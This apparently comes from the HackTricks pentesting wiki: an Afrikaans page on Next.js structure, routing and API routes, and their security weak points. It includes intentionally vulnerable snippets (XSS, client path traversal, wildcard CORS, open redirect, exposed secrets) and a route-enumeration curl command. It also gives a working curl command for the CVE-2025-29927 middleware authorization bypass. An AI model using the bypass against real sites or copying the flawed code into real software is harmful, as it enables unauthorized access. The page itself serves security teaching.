# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Algemene argitektuur van 'n Next.js-toepassing

### Tipiese lêerstruktuur

'n Standaard Next.js-projek volg 'n spesifieke lêer- en gidsstruktuur wat funksies soos routing, API-endpunte en bestuur van statiese assets vergemaklik. Hier is 'n tipiese uitleg:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Kern-gidse en lêers

- **public/:** Huisves statiese hulpbronne soos beelde, lettertipes en ander lêers. Lêers hier is toeganklik by die wortelpad (`/`).
- **app/:** Sentrale gids vir jou toepassing se bladsye, layouts, komponente en API-roetes. Omhels die **App Router**-paradigma, wat gevorderde routing-funksies en skeiding tussen server- en kliëntkomponente moontlik maak.
- **app/layout.tsx:** Bepaal die wortel-layout vir jou toepassing, draai om alle bladsye en verskaf konsekwente UI-elemente soos headers, footers en navigasiebalkies.
- **app/page.tsx:** Dien as die insetpunt vir die wortelroete `/`, en render die tuisblad.
- **app/[route]/page.tsx:** Hanteer statiese en dinamiese roetes. Elke gids binne `app/` verteenwoordig 'n roete-segment, en `page.tsx` binne daardie gidse ooreenstem met die roete se komponent.
- **app/api/:** Bevat API-roetes, wat jou toelaat om serverless funksies te skep wat HTTP-versoeke hanteer. Hierdie roetes vervang die tradisionele `pages/api`-gids.
- **app/components/:** Huisves herbruikbare React-komponente wat oor verskeie bladsye en layouts gebruik kan word.
- **app/styles/:** Bevat globale CSS-lêers en CSS Modules vir komponent-geskepte stylering.
- **app/utils/:** Sluit hulpfunksies, hulp-modules en ander nie-UI logika in wat oor die toepassing gedeel kan word.
- **.env.local:** Berg omgewingsveranderlikes spesifiek vir die plaaslike ontwikkel-omgewing. Hierdie veranderlikes word **nie** in weergawebeheer gestoor nie.
- **next.config.js:** Pas Next.js-gedrag aan, insluitend webpack-konfigurasies, omgewingsveranderlikes en sekuriteitsinstellings.
- **tsconfig.json:** Konfigureer TypeScript-instellings vir die projek, wat type checking en ander TypeScript-funksies moontlik maak.
- **package.json:** Beheer projek-afhanklikhede, skripte en metadata.
- **README.md:** Verskaf dokumentasie en inligting oor die projek, insluitend opstellingsinstruksies, gebruiksriglyne en ander relevante besonderhede.
- **yarn.lock / package-lock.json:** Sluit die projek se afhanklikhede vas op spesifieke weergawes, wat konsekwente installasies oor verskillende omgewings verseker.

## Kliëntkant in Next.js

### Lêer-gebaseerde roeting in die `app`-gids

Die `app`-gids is die hoeksteen van roeting in die nuutste Next.js-weergawes. Dit gebruik die lêerstelsel om roetes te definieer, wat roete-bestuur intuïtief en skaalbaar maak.

<details>

<summary>Hantering van die wortelpad /</summary>

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Belangrike Lêers:**

- **`app/page.tsx`**: Hanteer versoeke na die wortelpad `/`.
- **`app/layout.tsx`**: Definieer die uitleg van die toepassing en omvou alle bladsye.

**Implementering:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Verduideliking:**

- **Roete-definisie:** Die `page.tsx`-lêer direk onder die `app`-gids ooreenstem met die `/`-roete.
- **Weergawing:** Hierdie komponent render die inhoud vir die tuisblad.
- **Layout-integrasie:** Die `HomePage`-komponent word deur die `layout.tsx` omvou, wat headers, footers en ander algemene elemente kan insluit.

</details>

<details>

<summary>Hantering van Ander Statiese Paaie</summary>

**Voorbeeld: `/about` Route**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Verduideliking:**

- **Roete-definisie:** Die `page.tsx` lêer in die `about` gids ooreenstem met die `/about` roete.
- **Weergawing:** Hierdie komponent render die inhoud vir die about-bladsy.

</details>

<details>

<summary>Dinamiese roetes</summary>

Dinamiese roetes maak dit moontlik om paaie met veranderlike segmente te hanteer, sodat toepassings inhoud kan wys gebaseer op parameters soos IDs, slugs, ens.

**Voorbeeld: `/posts/[id]` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Verduideliking:**

- **Dinamiese segment:** `[id]` dui 'n dinamiese segment in die route aan en vang die `id`-parameter vanaf die URL.
- **Toegang tot parameters:** Die `params`-objek bevat die dinamiese parameters, toeganklik binne die komponent.
- **Roete-ooreenkoms:** Enige pad wat ooreenstem met `/posts/*`, soos `/posts/1`, `/posts/abc`, ens., sal deur hierdie komponent hanteer word.

</details>

<details>

<summary>Geneste roetes</summary>

Next.js ondersteun geneste routing, wat hiërargiese roetestrukture toelaat wat die gidsindeling weerspieël.

**Voorbeeld: `/dashboard/settings/profile` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Verduideliking:**

- **Diepe nesteling:** Die `page.tsx` lêer binne `dashboard/settings/profile/` stem ooreen met die `/dashboard/settings/profile` route.
- **Weerspieëling van hiërargie:** Die gidsstruktuur weerspieël die URL-pad, wat onderhoudbaarheid en duidelikheid verbeter.

</details>

<details>

<summary>Catch-all-roetes</summary>

Catch-all-roetes hanteer verskeie geneste segmente of onbekende paaie, en bied buigbaarheid in roetehantering.

**Voorbeeld: `/*` Route**

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Verduideliking:**

- **Catch-All-segment:** `[...slug]` vang al die oorblywende padsegmente as 'n array.
- **Gebruik:** Nuttig om dinamiese routing-scenario's te hanteer, soos deur gebruikers gegenereerde paaie, geneste kategorieë, ens.
- **Roete-ooreenkoms:** Paaie soos `/anything/here`, `/foo/bar/baz`, ens., word deur hierdie komponent hanteer.

</details>

### Potensiële kliëntkant-kwesbaarhede

Alhoewel Next.js 'n veilige grondslag bied, kan onvanpaste koderingpraktyke kwesbaarhede inbring. Belangrike kliëntkant-kwesbaarhede sluit in:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-aanvalle kom voor wanneer kwaadwillige skripte in vertroude webwerwe geïnjekteer word. Aanvallers kan skripte in gebruikers se blaaiers uitvoer, en data steel of handelinge namens die gebruiker uitvoer.

**Voorbeeld van kwesbare kode:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Waarom dit kwesbaar is:** Die gebruik van `dangerouslySetInnerHTML` met onbetroubare insette stel aanvallers in staat om kwaadwillige skripte in te spuit.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Gebeur wanneer gebruikersinsette verkeerd hanteer word in templates, wat aanvallers toelaat om templates of uitdrukkings in te spuit en uit te voer.

**Voorbeeld van kwesbare kode:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Hoekom dit kwesbaar is:** As `template` of `data` kwaadwillige inhoud bevat, kan dit lei tot die uitvoering van onbedoelde kode.

</details>

<details>

<summary>Client Path Traversal</summary>

Dit is 'n kwesbaarheid wat aanvalleerders toelaat om client-side paaie te manipuleer om onbedoelde aksies uit te voer, soos Cross-Site Request Forgery (CSRF). Anders as server-side path traversal, wat die server se lêerstelsel teiken, fokus CSPT daarop om client-side meganismes te misbruik om regmatige API-aanvrae na kwaadwillige endpoints om te lei.

**Voorbeeld van kwesbare kode:**

'n Next.js-toepassing laat gebruikers toe om lêers op te laai en af te laai. Die aflaaifunksie is aan die client-side geïmplementeer, waar gebruikers die lêerpad om af te laai kan spesifiseer.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Aanvalscenario

1. **Aanvaller se doelwit**: Voer 'n CSRF-aanval uit om 'n kritieke lêer te verwyder (bv. `admin/config.json`) deur die `filePath` te manipuleer.
2. **Exploiting CSPT**:
- **Kwaadaardige invoer**: Die aanvaller vervaardig 'n URL met 'n gemanipuleerde `filePath` soos `../deleteFile/config.json`.
- **Resulterende API-oproep**: Die kliëntkant-kode stuur 'n versoek na `/api/files/../deleteFile/config.json`.
- **Server se hantering**: As die bediener die `filePath` nie valideer nie, verwerk dit die versoek en kan sensitiewe lêers verwyder of blootgestel word.
3. **Uitvoering van CSRF**:
- **Gemaakte skakel**: Die aanvaller stuur die slagoffer 'n skakel of plaas 'n kwaadaardige script wat die aflaaiversoek met die gemanipuleerde `filePath` aktiveer.
- **Uitkoms**: Die slagoffer voer onbewustelik die aksie uit, wat tot ongemagtigde lêertoegang of verwydering lei.

#### Waarom dit kwesbaar is

- **Gebrek aan invoervalidasie**: Die kliëntkant laat arbitrêre `filePath`-invoere toe, wat path traversal moontlik maak.
- **Vertrou kliëntinvoer**: Die bedienerkant API vertrou en verwerk die `filePath` sonder sanitisering.
- **Potensiële API-aksies**: As die API-endpoint staatveranderende aksies uitvoer (bv. verwyder of wysig lêers), kan dit via CSPT uitgebuit word.

</details>

### Recon: static export route discovery via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Gebruik die ontdekte paaie (byvoorbeeld `/docs`, `/docs/content/examples`, `/signin`) om auth testing en endpoint discovery aan te dryf.

## Bedienerkant in Next.js

### Bedienerkant Rendering (SSR)

Bladsye word by elke versoek op die bediener gerender, wat verseker dat die gebruiker volledig gerenderde HTML ontvang. In hierdie geval moet jy jou eie pasgemaakte server skep om die versoeke te verwerk.

**Gebruiksgvalle:**

- Dinamiese inhoud wat gereeld verander.
- SEO-optimalisering, omdat soekenjins die volledig gerenderde bladsy kan kruip.

**Implementering:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statiese webwerf-generering (SSG)

Bladsye word vooraf gerender tydens die boutyd, wat lei tot vinniger laaitye en verminderde bedienerbelasting.

**Gebruikstoepassings:**

- Inhoud wat nie gereeld verander nie.
- Blogs, dokumentasie, bemarkingsbladsye.

**Implementering:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless Functions (API Routes)

Next.js maak dit moontlik om API endpoints as serverless functions te skep. Hierdie funksies loop op aanvraag sonder die behoefte aan 'n toegewyde server.

**Gebruikstoepassings:**

- Hantering van vorminsendings.
- Interaksie met databases.
- Verwerking van data of integrasie met derdeparty-API's.

**Implementering:**

Met die bekendstelling van die `app` directory in Next.js 13 het routing en API-hantering meer buigsaam en kragtig geword. Hierdie moderne benadering stem nouliks oorheen met die lêergebaseerde routeringstelsel, maar bring verbeterde vermoëns, insluitend ondersteuning vir server- en client-komponente.

#### Basic Route Handler

**File Structure:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementering:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Verduideliking:**

- **Ligging:** API routes word geplaas onder die `app/api/` gids.
- **Lêerbenaming:** Elke API endpoint is in sy eie gids wat 'n `route.js` of `route.ts` lêer bevat.
- **Gexporteerde funksies:** In plaas van 'n enkele default export, word spesifieke HTTP-metode funksies (bv. `GET`, `POST`) geëksporteer.
- **Response-hantering:** Gebruik die `Response` constructor om responses terug te gee, wat meer beheer oor headers en statuskodes toelaat.

#### Hoe om ander paaie en metodes te hanteer:

<details>

<summary>Hanering van Spesifieke HTTP-metodes</summary>

Next.js 13+ laat jou toe om handlers vir spesifieke HTTP-metodes in dieselfde `route.js` of `route.ts` lêer te definieer, wat duideliker en meer georganiseerde code bevorder.

**Voorbeeld:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Meervoudige Eksporte:** Elke HTTP-metode (`GET`, `PUT`, `DELETE`) het sy eie geëxporteerde funksie.
- **Parameters:** Die tweede argument gee toegang tot roeteparameters via `params`.
- **Verbeterde Responses:** Groter beheer oor response-objekte, wat presiese beheer van headers en statuskodes moontlik maak.

</details>

<details>

<summary>Catch-All en Geneste Routes</summary>

Next.js 13+ ondersteun gevorderde routing-funksies soos catch-all routes en geneste API-routes, wat meer dinamiese en skaalbare API-strukture moontlik maak.

**Catch-All Route Voorbeeld:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Sintaksis:** `[...]` dui 'n catch-all-segment aan, wat alle geneste paaie opvang.
- **Gebruik:** Nuttig vir APIs wat wisselende roete-dieptes of dinamiese segmente moet hanteer.

**Geneste Roetes Voorbeeld:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Verduideliking:**

- **Diepe genesting:** Maak hiërargiese API-strukture moontlik, wat hulpbronverhoudings weerspieël.
- **Parametertoegang:** Bied maklike toegang tot meerdere roeteparameters via die `params`-objek.

</details>

<details>

<summary>Hantering van API-roetes in Next.js 12 en vroeër</summary>

## API-roetes in die `pages`-gids (Next.js 12 en vroeër)

Voordat Next.js 13 die `app`-gids en verbeterde routing-vaardighede bekendgestel het, is API-roetes hoofsaaklik binne die `pages`-gids gedefinieer. Hierdie benadering word steeds wyd gebruik en word ondersteun in Next.js 12 en vroeër.

#### Basiese API-roete

**Lêerstruktuur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Verduideliking:**

- **Ligging:** API routes bevind hulle onder die `pages/api/` directory.
- **Export:** Gebruik `export default` om die handler-funksie te definieer.
- **Funksiehandtekening:** Die handler ontvang `req` (HTTP request) en `res` (HTTP response) objekte.
- **Routing:** Die lêernaam (`hello.js`) stem ooreen met die endpoint `/api/hello`.

#### Dinamiese API-roetes

**Lêerstruktuur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Verduideliking:**

- **Dinamiese Segmente:** Vierkante hakies (`[id].js`) dui dinamiese roete-segmente aan.
- **Toegang tot Parameters:** Gebruik `req.query.id` om die dinamiese parameter te kry.
- **Hanering van Metodes:** Gebruik voorwaardelike logika om verskillende HTTP-metodes (`GET`, `PUT`, `DELETE`, ens.) te hanteer.

#### Hantering van Verskillende HTTP-metodes

Terwyl die basiese API-routevoorbeeld alle HTTP-metodes binne 'n enkele funksie hanteer, kan jy jou kode struktureer om elke metode uitdruklik te hanteer vir beter duidelikheid en onderhoudbaarheid.

**Voorbeeld:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Beste praktyke:**

- **Skeiding van bekommernisse:** Duidelik skei logika vir verskillende HTTP-metodes.
- **Response-konsekwentheid:** Verseker konsekwente response-struktuur vir maklike client-side hantering.
- **Fouthantering:** Hanteer ongesupporteerde metodes en onverwagte foute op 'n elegante wyse.

</details>

### CORS Konfigurasie

Beheer watter origins toegang tot jou API-roetes kan kry, en verminder Cross-Origin Resource Sharing (CORS)-kwesbaarhede.

**Slegte konfigurasie-voorbeeld:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Let wel dat **CORS ook in al die API routes gekonfigureer kan word** binne die **`middleware.ts`**-lêer:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Probleem:**

- **`Access-Control-Allow-Origin: '*'`:** Laat enige webwerf toe om toegang tot die API te kry, wat potensieel kwaadwillige webwerwe toelaat om sonder beperkings met jou API te kommunikeer.
- **Breed Metode Toestemming:** Die toelaat van alle metodes kan aanvallers in staat stel om ongewenste aksies uit te voer.

**Hoe aanvallers dit misbruik:**

Aanvallers kan kwaadwillige webwerwe skep wat versoeke na jou API stuur, en sodoende funksionaliteit misbruik soos data-ophaling, data-manipulasie, of die veroorsaak van ongewenste aksies namens geverifieerde gebruikers.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Bedienerkode blootstelling aan die kliëntkant

Dit is maklik om **kode wat deur die bediener gebruik word ook in kode wat aan die kliëntkant blootgestel en gebruik word**, te gebruik; die beste manier om te verseker dat 'n kode-lêer nooit aan die kliëntkant blootgestel word nie, is deur hierdie import aan die begin van die lêer te gebruik:
```js
import "server-only"
```
## Belangrike lêers en hul rolle

### `middleware.ts` / `middleware.js`

**Ligging:** Root van die projek of binne `src/`.

**Doel:** Voer code uit in die server-side serverless function voordat 'n request verwerk word, wat dit moontlik maak om take soos authentication, redirects, of die wysiging van responses uit te voer.

**Uitvoeringsvloei:**

1. **Incoming Request:** Die middleware onderskep die request.
2. **Processing:** Voer operasies uit gebaseer op die request (bv. check authentication).
3. **Response Modification:** Kan die response verander of beheer oorhandig aan die volgende handler.

**Voorbeelde van gebruiksgevalle:**

- Herlei nie-geauthentiseerde gebruikers.
- Voeg pasgemaakte headers by.
- Log requests.

**Voorbeeldkonfigurasie:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

As outorisering in middleware afgedwing word, kan geaffekteerde Next.js-releases (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) omseil word deur die `x-middleware-subrequest` header in te spuit. Die framework sal middleware-recursion oorslaan en die beskermde bladsy teruggee.

- Basiese gedrag is gewoonlik 'n 307-omleiding na 'n aanmeld-roete soos `/api/auth/signin`.
- Stuur 'n lang `x-middleware-subrequest`-waarde (herhaal `middleware` om `MAX_RECURSION_DEPTH` te bereik) om die response na 200 te draai:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Omdat geauthentiseerde bladsye baie subbronne laai, voeg die header by elke versoek (bv., Burp Match/Replace met 'n leë match-string) om te verhoed dat assets herlei word.

### `next.config.js`

**Ligging:** Root van die projek.

**Doel:** Konfigureer Next.js-gedrag, maak dit moontlik om funksies aan of af te skakel, webpack-konfigurasies aan te pas, omgewingsvariabeles te stel, en verskeie sekuriteitsfunksies te konfigureer.

**Belangrike Sekuriteitskonfigurasies:**

<details>

<summary>Sekuriteitsheaders</summary>

Sekuriteitsheaders verbeter die veiligheid van jou toepassing deur blaaiers te instrueer hoe om inhoud te hanteer. Hulle help om verskeie aanvalle te beperk soos Cross-Site Scripting (XSS), Clickjacking, en MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Voorbeelde:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Beeldoptimaliseringsinstellings</summary>

Next.js optimaliseer beelde vir prestasie, maar wankonfigurasies kan tot sekuriteitskwesbaarhede lei — byvoorbeeld deur onbetroubare bronne toe te laat om kwaadwillige inhoud in te sluip.

**Slegte konfigurasievoorbeeld:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Probleem:**

- **`'*'`:** Laat toe dat beelde vanaf enige eksterne bron gelaai word, insluitend onbetroubare of kwaadwillige domeine. Aanvallers kan beelde aanbied wat kwaadwillige payloads bevat of inhoud wat gebruikers mislei.
- Nog 'n probleem kan wees om 'n domein toe te laat **waar enigiemand 'n beeld kan oplaai** (soos `raw.githubusercontent.com`)

**Hoe aanvallers dit misbruik:**

Deur beelde van kwaadwillige bronne in te voeg, kan aanvallers phishing-aanvalle uitvoer, misleidende inligting vertoon, of kwesbaarhede in beeld-rendering-biblioteke uitbuit.

</details>

<details>

<summary>Omgewingsveranderlike-blootstelling</summary>

Hanteer sensitiewe inligting soos API keys en database credentials veilig sonder om dit aan die kliënt bloot te stel.

#### a. Blootstelling van sensitiewe veranderlikes

**Slegte konfigurasievoorbeeld:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Probleem:**

- **`SECRET_API_KEY`:** Zonder die `NEXT_PUBLIC_` prefix maak Next.js nie veranderlikes beskikbaar op die client nie. As dit egter per ongeluk met die prefix voorsien word (bv. `NEXT_PUBLIC_SECRET_API_KEY`), word dit op die client-side toeganklik.

**Hoe aanvallers dit misbruik:**

As sensitiewe veranderlikes aan die client blootgestel word, kan aanvallers dit bekom deur die client-side code of netwerkversoeke te inspekteer, en sodoende ongemagtigde toegang tot APIs, databasisse of ander dienste verkry.

</details>

<details>

<summary>Omleidings</summary>

Beheer URL-omleidings en -herskrywings binne jou toepassing om te verseker dat gebruikers behoorlik gedirigeer word sonder om open redirect vulnerabilities te skep.

#### a. Open Redirect Vulnerability

**Slegte konfigurasie-voorbeeld:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Probleem:**

- **Dinamiese bestemming:** Laat gebruikers toe om enige URL te spesifiseer, wat open redirect attacks moontlik maak.
- **Vertrou gebruikersinvoer:** Herleiding na URL's wat deur gebruikers verskaf word sonder validering kan lei tot phishing, malware distribution, of credential theft.

**Hoe aanvallers dit misbruik:**

Aanvallers kan URL's opstel wat lyk asof dit vanaf jou domein kom, maar gebruikers herlei na kwaadaardige webwerwe. Byvoorbeeld:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Gebruikers wat die oorspronklike domein vertrou, kan onbewustelik na skadelike webwerwe navigeer.

</details>

<details>

<summary>Webpack-konfigurasie</summary>

Pas Webpack-konfigurasies vir jou Next.js-toepassing aan, wat per ongeluk sekuriteitskwesbaarhede kan inbring as dit nie versigtig hanteer word nie.

#### a. Blootstelling van sensitiewe modules

**Slegte konfigurasievoorbeeld:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Probleem:**

- **Blootstelling van Sensitiewe Paaie:** Aliasering van sensitiewe gidse en die toelaat van client-side toegang kan vertroulike inligting leak.
- **Bundeling van Geheime:** As sensitiewe lêers vir die client gebundel word, word hul inhoud toeganklik via source maps of deur die client-side code te inspekteer.

**Hoe aanvallers dit misbruik:**

Aanvallers kan toegang kry tot of die toepassing se gidsstruktuur herbou, en moontlik sensitiewe lêers of data vind en uitbuit.

</details>

### `pages/_app.js` and `pages/_document.js`

#### **`pages/_app.js`**

**Doel:** Oorskryf die standaard App component, wat globale state, style en layout-komponente moontlik maak.

**Gebruikgevalle:**

- Invoeg van globale CSS.
- Toevoeging van layout-wrappers.
- Integrasie van state management-biblioteke.

**Voorbeeld:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Doel:** Oorskryf die standaard Document, wat aanpassing van die HTML- en Body-tags moontlik maak.
